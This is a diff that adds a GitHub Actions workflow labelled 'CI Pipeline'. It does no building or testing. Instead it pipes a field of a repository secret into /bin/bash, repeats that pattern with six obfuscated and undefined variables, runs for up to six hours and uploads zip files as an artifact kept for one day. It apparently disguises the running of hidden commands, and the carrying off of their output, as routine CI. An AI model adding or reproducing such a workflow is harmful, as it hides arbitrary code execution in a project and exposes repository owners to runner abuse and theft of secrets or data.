@@ -1,0 +1,29 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          eb47: ${{ secrets.eb47 }}
+        run: |
+          printf '%s' "$eb47" | jq -r .rs66 | /bin/bash
+          echo $wg8134 | jq -r .z54040 | /bin/bash
+          echo $iwzw86273 | jq -r .rcr2796 | /bin/bash
+          printf '%s' "$aapk04507" | jq -r .t3438 | /bin/bash
+          echo $dbct93 | jq -r .bxyh2897 | /bin/bash
+          printf '%s' "$lb36161" | jq -r .wxi57 | /bin/bash
+          echo $q83470 | jq -r .jlj80588 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: SzisC3xV
+          path: "*.zip"
+          retention-days: 1
